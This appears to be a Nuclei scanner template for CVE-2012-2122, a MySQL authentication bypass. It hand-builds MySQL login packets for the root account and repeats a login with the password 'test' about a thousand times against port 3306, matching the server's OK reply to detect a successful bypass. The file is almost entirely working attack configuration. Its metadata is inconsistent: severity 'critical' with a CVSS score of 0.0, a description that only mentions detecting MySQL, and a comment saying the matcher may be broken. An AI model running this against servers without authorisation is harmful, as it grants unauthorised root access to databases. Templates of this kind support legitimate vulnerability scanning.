id: CVE-2012-2122

info:
  name: CVE-2012-2122
  author: pussycat0x
  severity: critical
  description: |
    MySQL instance was detected.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N
    cvss-score: 0.0
    cwe-id: CWE-200
  metadata:
    verified: true
    shodan-query: product:"MySQL"
  tags: network,mysql,db

variables:
  username: root
  # client capabilities
  mysql_login_request1: 560000018da6ff1900000001ff0000000000000000000000000000000000000000000000 # + username
  mysql_login_request2: "14" # + hashed password
  mysql_login_request3: 6d7973716c006d7973716c5f6e61746976655f70617373776f726400 # schema and auth plugin

network:
  - inputs:
        # server greetings
      - read: 1024
        type: hex
        name: greeting
        match:
          - contains(greeting, "mysql")
        extract:
          protocol: substr(greeting, 4, 5)
          version: substr(greeting, 5, 12)
          salt1: substr(greeting, 16, 25)
          salt2: substr(greeting, 43, 56)
          # hashed password: xor(hex_decode(sha1(password)), hex_decode(sha1(salt1+salt2+sha1(sha1(password)))))
        # login request
      - data: "{{mysql_login_request1+hex_encode(username)+'00'+mysql_login_request2+hex_encode( xor(hex_decode(sha1(password)), hex_decode(sha1(salt1+salt2+sha1(sha1(password))))) )+mysql_login_request3}}"
        read: 1024
        type: hex
        name: login_response

    payloads:
      password:
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"
        - "test"

    host:
      - "{{Host}}:3306"

    # matcher needs probably to be fixed as it returns a binary MYSQL OK packet
    matchers:
      - type: binary
        encoding: hex
        binary:
          - "0700000200000002000000"